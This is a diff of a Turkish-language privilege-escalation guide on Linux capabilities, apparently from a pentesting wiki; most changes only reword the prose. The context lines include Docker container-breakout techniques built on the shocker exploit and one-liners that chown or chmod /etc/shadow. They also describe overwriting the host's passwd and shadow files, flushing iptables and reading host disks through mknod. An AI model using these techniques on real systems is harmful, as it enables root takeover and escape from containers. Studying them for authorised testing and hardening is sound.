 Aşağıdaki istismar yönteminin nasıl çalıştığını [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) adresinden öğrenebilirsiniz, ancak özetle **CAP_DAC_READ_SEARCH** yalnızca dosya sisteminde izin kontrolleri olmadan gezinmemize izin vermekle kalmaz, aynı zamanda _**open_by_handle_at(2)**_ için herhangi bir kontrolü de açıkça kaldırır ve **işlemimizin diğer işlemler tarafından açılan hassas dosyalara erişmesine izin verebilir**.
 
-Bu izinleri kullanarak ana bilgisayardan dosyaları okumak için kullanılan orijinal istismarı burada bulabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), aşağıda **ilk argüman olarak okumak istediğiniz dosyayı belirtmenize ve bir dosyaya dökmenize olanak tanıyan değiştirilmiş bir versiyon bulunmaktadır.**
+Bu izinleri kullanarak ana bilgisayardan dosyaları okumak için istismar edilen orijinal istismarı burada bulabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), aşağıda **ilk argüman olarak okumak istediğiniz dosyayı belirtmenize ve bir dosyaya dökmenize olanak tanıyan değiştirilmiş bir versiyon bulunmaktadır.**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -927,19 +927,19 @@ return 0;
 }
 ```
 > [!WARNING]
-> Exploit, hostta monte edilmiş bir şeye işaretçi bulmak zorundadır. Orijinal exploit /.dockerinit dosyasını kullanıyordu ve bu değiştirilmiş versiyon /etc/hostname kullanıyor. Eğer exploit çalışmıyorsa belki farklı bir dosya ayarlamanız gerekebilir. Hostta monte edilmiş bir dosyayı bulmak için sadece mount komutunu çalıştırın:
+> Exploit, hostta monte edilmiş bir şeye işaret eden bir işaretçi bulmalıdır. Orijinal exploit /.dockerinit dosyasını kullanıyordu ve bu değiştirilmiş versiyon /etc/hostname kullanıyor. Eğer exploit çalışmıyorsa belki farklı bir dosya ayarlamanız gerekebilir. Hostta monte edilmiş bir dosyayı bulmak için sadece mount komutunu çalıştırın:
 
 ![](<../../images/image (407) (1).png>)
 
-**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "Abusing DAC_READ_SEARCH Capability" laboratuvarından kopyalanmıştır.**
+**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "DAC_READ_SEARCH Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**
 
 ## CAP_DAC_OVERRIDE
 
 **Bu, herhangi bir dosya üzerindeki yazma izin kontrollerini atlayabileceğiniz anlamına gelir, böylece herhangi bir dosyayı yazabilirsiniz.**
 
-Yetkileri artırmak için **üzerine yazabileceğiniz birçok dosya var,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Yetkileri artırmak için **üzerine yazabileceğiniz birçok dosya vardır,** [**buradan fikir alabilirsiniz**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
-**Binary ile örnek**
+**İkili ile örnek**
 
 Bu örnekte vim bu yetkiye sahiptir, bu nedenle _passwd_, _sudoers_ veya _shadow_ gibi herhangi bir dosyayı değiştirebilirsiniz:
 ```bash
@@ -971,7 +971,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Öncelikle, ev sahibinin rastgele dosyaları okumak için [**DAC_READ_SEARCH yeteneğini kötüye kullanan**](linux-capabilities.md#cap_dac_read_search) önceki bölümü okuyun ve **istismarı derleyin**.\
+Öncelikle, ev sahibinin rastgele dosyalarını okumak için [**DAC_READ_SEARCH yetkisini kötüye kullanan**](linux-capabilities.md#cap_dac_read_search) önceki bölümü okuyun ve **istismarı derleyin**.\
 Ardından, ev sahibinin dosya sisteminin içine **rastgele dosyalar yazmanıza** olanak tanıyacak **şok edici istismarın aşağıdaki sürümünü derleyin**:
 ```c
 #include <stdio.h>
@@ -1111,9 +1111,9 @@ close(fd1);
 return 0;
 }
 ```
-Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/passwd` dosyalarını **indirmek**, bunlara **yeni bir kullanıcı** eklemek ve **`shocker_write`** kullanarak üzerlerini yazmak gerekebilir. Ardından, **ssh** üzerinden **erişim** sağlanabilir.
+Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/passwd` dosyalarını **indirmek**, bunlara **yeni bir kullanıcı** eklemek ve **`shocker_write`** kullanarak bunları üzerine yazmak gerekir. Ardından, **ssh** üzerinden **erişim** sağlanabilir.
 
-**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **adresindeki "DAC_OVERRIDE Yetkisini Kötüye Kullanma" laboratuvarından kopyalanmıştır.**
+**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **adresindeki "Abusing DAC_OVERRIDE Capability" laboratuvarından kopyalanmıştır.**
 
 ## CAP_CHOWN
 
@@ -1121,7 +1121,7 @@ Docker konteynerinden çıkmak için, ana bilgisayardan `/etc/shadow` ve `/etc/p
 
 **İkili ile örnek**
 
-Diyelim ki **`python`** ikilisi bu yetkiye sahip, **shadow** dosyasının **sahibini** **değiştirebilir**, **root şifresini** **değiştirebilir** ve yetkileri artırabilirsiniz:
+Diyelim ki **`python`** ikilisi bu yetkiye sahip, **shadow** dosyasının **sahibini** **değiştirebilir**, **root şifresini** **değiştirebilir** ve ayrıcalıkları artırabilirsiniz:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
@@ -1131,11 +1131,11 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
 ## CAP_FOWNER
 
-**Bu, herhangi bir dosyanın izinlerini değiştirmenin mümkün olduğu anlamına gelir.**
+**Bu, herhangi bir dosyanın izinlerini değiştirme olanağına sahip olduğunuz anlamına gelir.**
 
 **İkili ile örnek**
 
-Eğer python bu yetkiye sahipse, gölge dosyasının izinlerini değiştirebilir, **root şifresini değiştirebilir** ve ayrıcalıkları artırabilirsiniz:
+Eğer python bu yetkiye sahipse, shadow dosyasının izinlerini değiştirebilir, **root şifresini değiştirebilir** ve ayrıcalıkları artırabilirsiniz:
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
@@ -1187,7 +1187,7 @@ Bu durumda grup shadow taklit edildi, böylece `/etc/shadow` dosyasını okuyabi
 ```bash
 cat /etc/shadow
 ```
-Eğer **docker** yüklüyse, **docker grubunu** taklit edebilir ve [**docker soketi** ile iletişim kurmak ve ayrıcalıkları artırmak](./#writable-docker-socket) için bunu kötüye kullanabilirsiniz.
+Eğer **docker** yüklüyse, **docker grubunu** taklit edebilir ve [**docker soketi** ile iletişim kurmak ve ayrıcalıkları artırmak](#writable-docker-socket) için bunu kötüye kullanabilirsiniz.
 
 ## CAP_SETFCAP
 
@@ -1223,13 +1223,13 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 > [!WARNING]
-> Yeni bir yetkiyi CAP_SETFCAP ile ikili dosyaya ayarlarsanız, bu yetkiyi kaybedeceksiniz.
+> Yeni bir yetkiyi CAP_SETFCAP ile ikili dosyaya ayarlarsanız, bu yetkiyi kaybedeceğinizi unutmayın.
 
-Bir [SETUID yetkisi](linux-capabilities.md#cap_setuid) aldıktan sonra, ayrıcalıkları nasıl artıracağınızı görmek için ilgili bölümüne gidebilirsiniz.
+Bir [SETUID yetkisine](linux-capabilities.md#cap_setuid) sahip olduğunuzda, ayrıcalıkları nasıl artıracağınızı görmek için ilgili bölümüne gidebilirsiniz.
 
 **Ortam ile örnek (Docker breakout)**
 
-Varsayılan olarak, **CAP_SETFCAP yetkisi Docker'daki konteyner içindeki işleme verilir**. Bunu yapmak için şöyle bir şey yaparak kontrol edebilirsiniz:
+Varsayılan olarak, **CAP_SETFCAP yetkisi Docker'daki konteyner içindeki işleme verilir**. Bunu kontrol etmek için şöyle bir şey yapabilirsiniz:
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1241,7 +1241,7 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-Bu yetenek, **binaries'e herhangi bir başka yetenek verme** imkanı tanır, bu nedenle bu sayfada bahsedilen **diğer yetenek kaçışlarını** istismar ederek konteynerden **kaçmayı** düşünebiliriz.\
+Bu yetenek, **binaries'e herhangi bir başka yetenek verme** imkanı tanır, bu nedenle bu sayfada bahsedilen **diğer yetenek kırılmalarını** istismar ederek konteynerden **kaçmayı** düşünebiliriz.\
 Ancak, örneğin gdb binary'sine CAP_SYS_ADMIN ve CAP_SYS_PTRACE yeteneklerini vermeye çalışırsanız, bunları verebildiğinizi göreceksiniz, ancak **binary bundan sonra çalıştırılamayacaktır**:
 ```bash
 getcap /usr/bin/gdb
@@ -1254,9 +1254,9 @@ bash: /usr/bin/gdb: Operation not permitted
 ```
 [From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Bu, bir iş parçacığının üstlenebileceği **etkili yetenekler için sınırlayıcı bir süper kümedir**. Ayrıca, etkili kümesinde **CAP_SETPCAP** yeteneğine sahip olmayan bir iş parçacığı tarafından miras alınabilir kümeye eklenebilecek yetenekler için de sınırlayıcı bir süper kümedir._\
 Görünüşe göre, İzin verilen yetenekler kullanılabilecek olanları sınırlar.\
-Ancak, Docker varsayılan olarak **CAP_SETPCAP** yeteneğini de verir, bu nedenle **miras alınabilir olanların içine yeni yetenekler ekleyebilirsin**.\
+Ancak, Docker varsayılan olarak **CAP_SETPCAP** yeteneğini de verir, bu nedenle **miras alınabilir yetenekler içinde yeni yetenekler ayarlayabilirsiniz**.\
 Ancak, bu yeteneğin belgelerinde: _CAP_SETPCAP : \[…] **çağrılan iş parçacığının sınırlayıcı** kümesinden miras alınabilir kümesine herhangi bir yetenek ekler_.\
-Görünüşe göre, yalnızca sınırlayıcı kümeden miras alınabilir küme yeteneklerine ekleme yapabiliyoruz. Bu da, **yeni yetenekler olan CAP_SYS_ADMIN veya CAP_SYS_PTRACE'ı miras kümesine ekleyemeyeceğimiz** anlamına geliyor.
+Görünüşe göre, yalnızca sınırlayıcı kümeden miras alınabilir küme yeteneklerine ekleme yapabiliyoruz. Bu da **yeni yetenekler, örneğin CAP_SYS_ADMIN veya CAP_SYS_PTRACE'ı miras kümesine ekleyemeyeceğimiz** anlamına geliyor.
 
 ## CAP_SYS_RAWIO
 
@@ -1270,7 +1270,7 @@ Bu, **yetki yükseltme** ve **Docker kırılması** için faydalı olabilir.
 
 **İkili ile örnek**
 
-Diyelim ki **`python`** ikilisi bu yeteneğe sahip. Eğer **bir hizmet veya soket yapılandırmasını** (veya bir hizmetle ilgili herhangi bir yapılandırma dosyasını) da değiştirebilirsen, onu arka kapı ile değiştirebilir ve ardından o hizmetle ilgili süreci öldürüp yeni yapılandırma dosyasının arka kapınla çalıştırılmasını bekleyebilirsin.
+Diyelim ki **`python`** ikilisi bu yeteneğe sahip. Eğer **bir hizmet veya soket yapılandırma** (veya bir hizmetle ilgili herhangi bir yapılandırma dosyası) dosyasını da değiştirebilirseniz, onu arka kapı ile değiştirebilir ve ardından o hizmetle ilgili süreci öldürüp yeni yapılandırma dosyasının arka kapınızla çalıştırılmasını bekleyebilirsiniz.
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1280,7 +1280,7 @@ os.killpg(pgid, signal.SIGKILL)
 ```
 **Privesc with kill**
 
-Eğer kill yetkileriniz varsa ve **root olarak çalışan bir node programı** (veya farklı bir kullanıcı olarak) varsa, muhtemelen **ona** **SIGUSR1 sinyalini** **gönderebilir** ve **node hata ayıklayıcısını** açmasını sağlayabilirsiniz.
+Eğer kill yetkileriniz varsa ve **root olarak çalışan bir node programı** (veya farklı bir kullanıcı olarak) varsa, muhtemelen **SIGUSR1 sinyalini** gönderip **node debugger'ı açmasını** sağlayabilirsiniz.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1296,7 +1296,7 @@ electron-cef-chromium-debugger-abuse.md
 
 **İkili ile örnek**
 
-Eğer **`python`** bu yeteneğe sahipse, herhangi bir portta dinleyebilecek ve hatta bu porttan başka bir porta bağlanabilecektir (bazı hizmetler belirli ayrıcalıklı portlardan bağlantılar gerektirir)
+Eğer **`python`** bu yeteneğe sahipse, herhangi bir portta dinleyebilir ve hatta bu porttan başka bir porta bağlanabilir (bazı hizmetler belirli ayrıcalıklı portlardan bağlantılar gerektirir)
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1312,7 +1312,7 @@ print(output)
 ```
 {{#endtab}}
 
-{{#tab name="Bağlan"}}
+{{#tab name="Connect"}}
 ```python
 import socket
 s=socket.socket()
@@ -1324,7 +1324,7 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, süreçlerin **RAW ve PACKET soketleri** oluşturmasına izin verir, bu da onlara rastgele ağ paketleri oluşturma ve gönderme yeteneği kazandırır. Bu, konteynerleştirilmiş ortamlarda paket sahteciliği, trafik enjeksiyonu ve ağ erişim kontrollerinin atlatılması gibi güvenlik risklerine yol açabilir. Kötü niyetli aktörler, bu durumu konteyner yönlendirmesini etkilemek veya ana makine ağ güvenliğini tehlikeye atmak için kullanabilir, özellikle yeterli güvenlik duvarı korumaları olmadan. Ayrıca, **CAP_NET_RAW**, ayrıcalıklı konteynerlerin RAW ICMP istekleri aracılığıyla ping gibi işlemleri desteklemesi için kritik öneme sahiptir.
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, süreçlerin **RAW ve PACKET soketleri oluşturmasına** izin verir, bu da onların rastgele ağ paketleri oluşturup göndermesine olanak tanır. Bu, konteynerleştirilmiş ortamlarda paket sahteciliği, trafik enjeksiyonu ve ağ erişim kontrollerinin atlatılması gibi güvenlik risklerine yol açabilir. Kötü niyetli aktörler, bu durumu konteyner yönlendirmesini etkilemek veya ana makine ağ güvenliğini tehlikeye atmak için kullanabilir, özellikle yeterli güvenlik duvarı korumaları yoksa. Ayrıca, **CAP_NET_RAW**, ayrıcalıklı konteynerlerin RAW ICMP istekleri aracılığıyla ping gibi işlemleri desteklemesi için kritik öneme sahiptir.
 
 **Bu, trafiği dinlemenin mümkün olduğu anlamına gelir.** Bu yetki ile doğrudan ayrıcalıkları artırmak mümkün değildir.
 
@@ -1385,11 +1385,11 @@ count=count+1
 ```
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, sahibine **ağ yapılandırmalarını değiştirme** gücü verir; bu, güvenlik duvarı ayarları, yönlendirme tabloları, soket izinleri ve maruz kalmış ağ ad alanları içindeki ağ arayüzü ayarlarını içerir. Ayrıca, ağ arayüzlerinde **promiscuous mode**'u açma yetkisi vererek, ad alanları arasında paket dinlemeye olanak tanır.
+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) yetkisi, sahibine **ağ yapılandırmalarını değiştirme** gücünü verir; bu, güvenlik duvarı ayarları, yönlendirme tabloları, soket izinleri ve maruz kalmış ağ ad alanları içindeki ağ arayüzü ayarlarını içerir. Ayrıca, ağ arayüzlerinde **promiscuous mode**'u açma yeteneği sağlar, bu da ad alanları arasında paket dinlemeye olanak tanır.
 
 **Binary ile örnek**
 
-Diyelim ki **python binary** bu yetkilere sahip.
+Diyelim ki **python binary**'sinin bu yetkilere sahip.
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1403,11 +1403,11 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP_LINUX_IMMUTABLE
 
-**Bu, inode niteliklerini değiştirmenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları yükseltemezsiniz.
+**Bu, inode niteliklerini değiştirmenin mümkün olduğu anlamına gelir.** Bu yetenekle doğrudan ayrıcalıkları artırmak mümkün değildir.
 
 **İkili ile örnek**
 
-Bir dosyanın değiştirilemez olduğunu ve python'un bu yeteneğe sahip olduğunu bulursanız, **değiştirilemez niteliği kaldırabilir ve dosyayı değiştirilebilir hale getirebilirsiniz:**
+Eğer bir dosyanın değiştirilemez olduğunu ve python'un bu yeteneğe sahip olduğunu bulursanız, **değiştirilemez niteliği kaldırabilir ve dosyayı değiştirilebilir hale getirebilirsiniz:**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1447,26 +1447,26 @@ f.write('New content for the file\n')
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), belirli donanım platformları için özelleştirilmiş `LINUX_REBOOT_CMD_RESTART2` gibi komutlar da dahil olmak üzere, sistem yeniden başlatmaları için `reboot(2)` sistem çağrısının yürütülmesine izin verir; ayrıca, Linux 3.17'den itibaren yeni veya imzalı çökme çekirdeklerini yüklemek için `kexec_load(2)` ve `kexec_file_load(2)` kullanımını da sağlar.
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), belirli donanım platformları için uyarlanmış `LINUX_REBOOT_CMD_RESTART2` gibi özel komutlar da dahil olmak üzere sistem yeniden başlatmaları için `reboot(2)` sistem çağrısının yürütülmesine izin verir; ayrıca, Linux 3.17'den itibaren yeni veya imzalı çökme çekirdeklerini yüklemek için `kexec_load(2)` ve `kexec_file_load(2)` kullanımını da sağlar.
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş **CAP_SYS_ADMIN**'den ayrılmıştır ve `syslog(2)` çağrısını kullanma yetkisini özel olarak vermektedir. Bu yetenek, `kptr_restrict` ayarı 1 olduğunda, çekirdek adreslerinin `/proc` ve benzeri arayüzler aracılığıyla görüntülenmesini sağlar; bu ayar, çekirdek adreslerinin maruz kalmasını kontrol eder. Linux 2.6.39'dan itibaren, `kptr_restrict` için varsayılan değer 0'dır, bu da çekirdek adreslerinin maruz kaldığı anlamına gelir; ancak birçok dağıtım bunu güvenlik nedenleriyle 1 (uid 0 dışındaki adresleri gizle) veya 2 (her zaman adresleri gizle) olarak ayarlamaktadır.
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş **CAP_SYS_ADMIN**'den ayrılmıştır ve `syslog(2)` çağrısını kullanma yetkisini özel olarak vermektedir. Bu yetenek, `kptr_restrict` ayarı 1 olduğunda, çekirdek adreslerinin `/proc` ve benzeri arayüzler aracılığıyla görüntülenmesini sağlar; bu ayar, çekirdek adreslerinin ifşasını kontrol eder. Linux 2.6.39'dan itibaren, `kptr_restrict` için varsayılan değer 0'dır, bu da çekirdek adreslerinin ifşa edildiği anlamına gelir; ancak birçok dağıtım bunu güvenlik nedenleriyle 1 (uid 0 dışındaki adresleri gizle) veya 2 (her zaman adresleri gizle) olarak ayarlamaktadır.
 
-Ayrıca, **CAP_SYSLOG**, `dmesg_restrict` 1 olarak ayarlandığında `dmesg` çıktısına erişim sağlar. Bu değişikliklere rağmen, **CAP_SYS_ADMIN**, tarihsel nedenlerden dolayı `syslog` işlemlerini gerçekleştirme yeteneğini korur.
+Ayrıca, **CAP_SYSLOG**, `dmesg_restrict` 1 olarak ayarlandığında `dmesg` çıktısına erişim sağlar. Bu değişikliklere rağmen, **CAP_SYS_ADMIN**, tarihsel nedenlerden dolayı `syslog` işlemlerini gerçekleştirme yeteneğini korumaktadır.
 
 ## CAP_MKNOD
 
-[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` sistem çağrısının işlevselliğini, normal dosyalar, FIFO'lar (adlandırılmış borular) veya UNIX alan soketleri oluşturmanın ötesine genişletir. Özellikle, aşağıdaki özel dosyaların oluşturulmasına izin verir:
+[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` sistem çağrısının işlevselliğini, normal dosyalar, FIFO'lar (adlandırılmış borular) veya UNIX alan soketleri oluşturmanın ötesine taşır. Özellikle, aşağıdaki özel dosyaların oluşturulmasına izin verir:
 
 - **S_IFCHR**: Terminal gibi karakter özel dosyaları.
-- **S_IFBLK**: Disk gibi blok özel dosyaları.
+- **S_IFBLK**: Diskler gibi blok özel dosyaları.
 
 Bu yetenek, cihaz dosyaları oluşturma yeteneğine ihtiyaç duyan süreçler için gereklidir ve karakter veya blok cihazları aracılığıyla doğrudan donanım etkileşimini kolaylaştırır.
 
 Bu, varsayılan bir docker yeteneğidir ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
-Bu yetenek, aşağıdaki koşullar altında ana makinede ayrıcalık yükseltmelerine (tam disk okuma yoluyla) izin verir:
+Bu yetenek, aşağıdaki koşullar altında ana makinede ayrıcalık yükseltmeleri (tam disk okuma yoluyla) yapmaya izin verir:
 
 1. Ana makineye başlangıç erişimine sahip olmak (Yetkisiz).
 2. Konteynıra başlangıç erişimine sahip olmak (Yetkili (EUID 0) ve etkili `CAP_MKNOD`).
@@ -1476,7 +1476,7 @@ Bu yetenek, aşağıdaki koşullar altında ana makinede ayrıcalık yükseltmel
 
 1. **Ana Makinede Standart Kullanıcı Olarak:**
 
-- `id` ile mevcut kullanıcı kimliğinizi belirleyin, örneğin, `uid=1000(standartuser)`.
+- `id` ile mevcut kullanıcı kimliğinizi belirleyin, örneğin, `uid=1000(standarduser)`.
 - Hedef cihazı belirleyin, örneğin, `/dev/sdb`.
 
 2. **Konteyner İçinde `root` Olarak:**
@@ -1499,13 +1499,13 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-Bu yaklaşım, standart kullanıcının `/dev/sdb`'ye erişmesini ve potansiyel olarak verileri okumasını sağlar, paylaşılan kullanıcı ad alanları ve cihaz üzerindeki izinleri kullanarak.
+Bu yaklaşım, standart kullanıcının `/dev/sdb`'ye erişmesini ve potansiyel olarak verileri okumasını sağlar; bu, paylaşılan kullanıcı ad alanları ve cihaz üzerindeki izinlerin istismar edilmesiyle gerçekleşir.
 
 ### CAP_SETPCAP
 
-**CAP_SETPCAP**, bir sürecin **başka bir sürecin yetenek setlerini değiştirmesine** olanak tanır; bu, etkili, miras alınabilir ve izin verilen setlerden yeteneklerin eklenmesi veya kaldırılmasını sağlar. Ancak, bir süreç yalnızca kendi izin verilen setinde sahip olduğu yetenekleri değiştirebilir, bu da başka bir sürecin ayrıcalıklarını kendi seviyesinin ötesine yükseltmesini engeller. Son zamanlarda yapılan çekirdek güncellemeleri bu kuralları sıkılaştırmış, `CAP_SETPCAP`'ı yalnızca kendi veya alt süreçlerinin izin verilen setlerindeki yetenekleri azaltmakla sınırlamıştır; bu, güvenlik risklerini azaltmayı amaçlamaktadır. Kullanım, etkili set içinde `CAP_SETPCAP` ve izin verilen set içinde hedef yeteneklere sahip olmayı gerektirir; değişiklikler için `capset()` kullanılır. Bu, `CAP_SETPCAP`'ın temel işlevini ve sınırlamalarını özetler, ayrıcalık yönetimi ve güvenlik artırımı konusundaki rolünü vurgular.
+**CAP_SETPCAP**, bir sürecin **başka bir sürecin yetenek setlerini değiştirmesine** olanak tanır; bu, etkili, miras alınabilir ve izin verilen setlerden yeteneklerin eklenmesi veya kaldırılmasını sağlar. Ancak, bir süreç yalnızca kendi izin verilen setinde sahip olduğu yetenekleri değiştirebilir, bu da başka bir sürecin ayrıcalıklarını kendi seviyesinin ötesine yükseltmesini engeller. Son zamanlarda yapılan çekirdek güncellemeleri bu kuralları sıkılaştırmış, `CAP_SETPCAP`'ı yalnızca kendi veya alt süreçlerinin izin verilen setlerindeki yetenekleri azaltmakla sınırlamıştır; bu, güvenlik risklerini azaltmayı amaçlamaktadır. Kullanım, etkili set içinde `CAP_SETPCAP` ve izin verilen set içinde hedef yeteneklere sahip olmayı gerektirir; değişiklikler için `capset()` kullanılır. Bu, `CAP_SETPCAP`'ın temel işlevini ve sınırlamalarını özetler, ayrıcalık yönetimi ve güvenlik artırma rolünü vurgular.
 
-**`CAP_SETPCAP`**, bir sürecin **başka bir sürecin yetenek setlerini değiştirmesine** olanak tanıyan bir Linux yeteneğidir. Diğer süreçlerin etkili, miras alınabilir ve izin verilen yetenek setlerinden yetenek ekleme veya kaldırma yetkisi verir. Ancak, bu yeteneğin nasıl kullanılacağına dair belirli kısıtlamalar vardır.
+**`CAP_SETPCAP`**, bir sürecin **başka bir sürecin yetenek setlerini değiştirmesine** olanak tanıyan bir Linux yeteneğidir. Diğer süreçlerin etkili, miras alınabilir ve izin verilen yetenek setlerinden yetenek ekleme veya kaldırma yeteneği verir. Ancak, bu yeteneğin nasıl kullanılacağına dair belirli kısıtlamalar vardır.
 
 `CAP_SETPCAP`'a sahip bir süreç **yalnızca kendi izin verilen yetenek setinde bulunan yetenekleri verebilir veya kaldırabilir**. Diğer bir deyişle, bir süreç, kendisinde bulunmayan bir yeteneği başka bir sürece veremez. Bu kısıtlama, bir sürecin başka bir sürecin ayrıcalıklarını kendi ayrıcalık seviyesinin ötesine yükseltmesini engeller.
 
@@ -1517,7 +1517,7 @@ Ayrıca, son çekirdek sürümlerinde, `CAP_SETPCAP` yeteneği **daha da kısıt
 
 ## Referanslar
 
-**Bu örneklerin çoğu** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) adresindeki bazı laboratuvarlardan alınmıştır, bu nedenle bu privesc tekniklerini uygulamak istiyorsanız bu laboratuvarları öneririm.
+**Bu örneklerin çoğu** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **laboratuvarlarından alınmıştır, bu nedenle bu privesc tekniklerini uygulamak istiyorsanız bu laboratuvarları öneririm.**
 
 **Diğer referanslar**:
 
